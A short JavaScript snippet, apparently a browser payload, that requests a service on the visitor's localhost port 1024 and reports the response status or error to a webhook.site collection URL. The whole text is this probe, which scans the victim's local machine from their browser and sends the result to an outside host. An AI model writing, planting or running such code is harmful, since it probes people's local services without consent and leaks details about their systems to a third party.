try{
  var a = await fetch("https://localhost:1024/",{"mode":"cors"}).then(resp => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+resp.status,{"mode":"cors"})})
}catch(err){
  await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err,{"mode":"cors"});
}
  
